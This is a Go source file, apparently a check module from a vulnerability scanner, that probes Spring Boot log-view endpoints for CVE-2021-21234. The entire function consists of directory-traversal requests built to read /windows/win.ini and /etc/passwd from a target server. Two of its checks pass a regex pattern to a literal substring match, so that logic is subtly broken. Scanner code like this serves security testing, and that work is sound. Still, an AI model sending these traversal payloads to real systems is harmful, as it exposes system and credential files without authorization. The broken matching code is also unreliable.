package springboot

import (
	"Predator/pkg/utils"
	"strings"
)

func CVE_2021_21234(u string) bool {
	if req, err := utils.HttpRequset(u+"/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "for 16-bit app support") {
			return true
		}
	}
	if req, err := utils.HttpRequset(u+"/log/view?filename=/windows/win.ini&base=../../../../../../../../../../", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "for 16-bit app support") {
			return true
		}
	}
	if req, err := utils.HttpRequset(u+"/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root:.*:0:0:") {
			return true
		}
	}
	if req, err := utils.HttpRequset(u+"/log/view?filename=/etc/passwd&base=../../../../../../../../../../", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root:.*:0:0:") {
			return true
		}
	}
	return false
}
